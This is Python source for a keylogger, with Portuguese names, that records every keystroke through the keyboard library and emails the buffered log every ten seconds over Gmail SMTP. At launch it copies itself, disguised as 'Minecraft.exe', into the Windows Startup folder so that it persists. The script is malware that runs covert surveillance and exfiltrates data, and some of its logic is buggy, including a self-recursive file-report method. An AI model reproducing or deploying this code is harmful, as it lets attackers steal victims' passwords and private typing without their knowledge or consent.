#!/usr/bin/env python


import shutil
import keyboard
from datetime import datetime
from threading import Timer
import smtplib
import os
import os.path
from os import path

TEMPO_DE_ENVIO= 10
EMAIL = os.environ.get("USER_MAIL")
PASSWORD = os.environ.get("USER_PASS")

#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

class Keylogger:


    def __init__(self, interval, report_method="email"):

        self.interval = interval

        self.report_method = report_method

        self.log = ""

        self.start_dt = datetime.now()

        self.end_dt = datetime.now()

    def sendmail(self, email, password, message):

        msg = f'Subject:{self.filename}\n\n{message}'

        with smtplib.SMTP('smtp.gmail.com', 587) as server:

            server.ehlo()

            server.starttls()

            server.ehlo()

            server.login(email, password)

            server.sendmail(email, email, msg)

            server.quit()

    def callback(self, event):

        name = event.name

        if len(name) > 1:

            if name == "space":

                name = " "

            elif name == "enter":

                name = "[ENTER]\n"

            elif name == "decimal":

                name = "."

            else:

                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):

        data_inicio = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")

        data_fim = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")

        self.filename = f"log-{data_inicio}_{data_fim}"

    def report_to_file(self):

        if self.log:

            self.end_dt = datetime.now()

            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL, PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()

            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        timer.daemon = True

        timer.start()


    def report(self):

        if self.log:

            self.end_dt = datetime.now()

            self.update_filename()

            self.report_to_file()

            self.start_dt = datetime.now()

        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)

        timer.daemon = True

        timer.start()

    def start(self):

        self.start_dt = datetime.now()

        keyboard.on_release(callback=self.callback)

        self.report()


        keyboard.wait()


if __name__ == "__main__":

    if path.exists('C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp/Minecraft.exe') == False:

        dir_path = os.path.dirname(os.path.realpath(__file__))

        dir_path = dir_path + "\Minecraft.exe"

        shutil.copy(dir_path,'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')

    keylogger = Keylogger(interval=TEMPO_DE_ENVIO, report_method="email")
    keylogger.start()

